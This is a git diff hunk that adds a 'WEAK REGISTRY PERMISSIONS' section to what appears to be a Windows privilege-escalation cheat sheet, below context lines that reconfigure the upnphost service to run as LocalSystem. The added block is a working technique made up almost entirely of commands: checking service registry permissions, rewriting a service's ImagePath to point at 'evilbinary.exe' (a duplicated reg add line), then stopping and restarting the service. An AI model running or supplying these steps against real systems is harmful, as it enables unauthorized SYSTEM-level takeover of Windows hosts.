@@ -39,3 +39,16 @@ sc config upnphost obj= ".\LocalSystem" password= ""
 sc qc upnphost
 
 ```
+### WEAK REGISTRY PERMISSIONS
+
+```
+accexxchk.exe -kvw MeMe HKLM\SYSTEM\CurrentControlSet\Services\
+
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\WeakService4" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\MeMe\Desktop\evilbinary.exe" /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\WeakService4" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\MeMe\Desktop\evilbinary.exe" /f
+
+sc qc WeakService4
+sc stop WeakService4
+sc start WeakService4
+
+```
